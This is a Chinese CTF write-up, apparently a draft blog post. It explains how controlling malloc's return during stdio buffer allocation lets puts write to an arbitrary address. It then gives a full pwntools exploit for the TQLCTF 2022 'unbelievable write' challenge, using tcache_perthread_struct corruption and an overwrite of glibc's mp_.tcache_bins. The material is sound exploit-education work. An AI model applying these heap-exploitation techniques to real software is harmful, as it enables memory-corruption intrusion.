---
title: "libc_stdio_buffer初始化"
slug: stdio-buffer
description: "分析 stdio 流首次读写时缓冲区的延迟分配过程，说明控制 malloc 返回值可将 puts 数据写入任意地址。"
date: 2026-09-16
author: mixt
category: IO_FILE
tags: [C++, Linux, 网络编程, 面试]
featured: false
draft: true
---
程序启动时，stdout/stderr/stdin三个流的缓冲区_IO_buf_base为NULL
而只有第一次读写这个流时(如调用puts)
会执行下述代码
if (fp->_IO_buf_base == NULL)
    _IO_file_doallocate(fp);   
在_IO_file_doallocate中,有以下操作：
    size=_IO_BUFSIZ ; (一般为0x1000)
    p = malloc(size);
    fp -> _IO_buf_base = p;
    fp -> _IO_buf_end = p + size;
之后puts("...")把字符串复制进申请的缓冲区
如果我们能控制malloc(size)的返回值，让它返回我们想要的地址Target 
那么Target就会被写入puts的参数

例：[TQLCTF 2022]unbelievable write
漏洞类型：
/images/mixt/c3d97da6b99988dab7c595230e56da36.png
c2有着一个任意地址释放
/images/mixt/9784b1d3dabe6008127a69d875a75d8d.png
如果能成功将target中的内容修改，就可以拿到flag
/images/mixt/3d38d8ce3b70deaff2d6240741c498a6.png
c1在使用过chunk后会立即释放
导致我在了解过libc_stdio_buffer之前的多次尝试全部失败
（即使将chunk申请到了target程序也会因为无法过free检查而崩溃）

利用：通过c2释放掉tcache_pthread_struct，申请回来的同时将0x280的count设为8，这样再释放它就会进入unsortbin
将其切割（布置好count），再合并，会在tcache_pthread_struct上留下libc指针
/images/mixt/bins.png
修改对应count，并准备好0x1010的count，并通过字节爆破(1/16)到mp_区域
/images/mixt/mp_.png
修改mp_.tcache_bins，让0x1010的chunk也被视为tcache
/images/mixt/target.png
之后再进入c3，可以看到target被成功修改

exp:
  1 from pwn import*
  2 io=process(b'./pwn_patched',stdout=PIPE)
  3 #io=remote(b'node4.anna.nssctf.cn',24574)
  4 libc=ELF(b'./libc.so.6')
  5 #io=remote(b'node4.anna.nssctf.cn',22516)
  6 #target 0xFEDCBA9876543210 0x404080
  7 def cmd(choice):
  8     io.sendlineafter(b'>',str(choice).encode())
  9 def add_chunk(size,content=b'a'):
 10     cmd(1)
 11     io.sendline(str(size).encode())
 12     io.send(content)
 13 def delete_chunk(content):
 14     cmd(2)
 15     io.sendline(content)
 16 def tcache_count(idx):
 17     res=[b'\x00\x00' for _ in range(64)]  #0x290 - 0x20 = 39
 18     for t in idx:
 19         res[(t - 0x20)//0x10]=b'\x08\x00'
 20     return b''.join(res)
 21 add_chunk(0x9f0,p64(0x404078) * (0x9f0//8))
 22 delete_chunk(b'-656')
 23 add_chunk(0x280,tcache_count([0x290]) + b'\n')
 24 add_chunk(0x260,tcache_count([0x270]) + b'\n')
 25 add_chunk(0x280,tcache_count([0x290,0x400,0x410]) + b'\x01\x00' * 4 * ((0x400 - 0x20)//0x10) + b'\x90\xe2' + b'\n')
 26 mp_=libc.symbols['mp_']
 27 log.success(f'{hex(mp_)}')
 28 payload=p64(0x20000)  + p64(0x8) + p64(0) + p64(0x10000) +p64(0) * 3 + p64(0x1301000) + p64(0xffffffffffffffff) + b'\n'
 29 gdb.attach(io)
 30 add_chunk(0x3f0,payload)
 31 cmd(3)
 32 cmd(3)
 33 io.interactive()















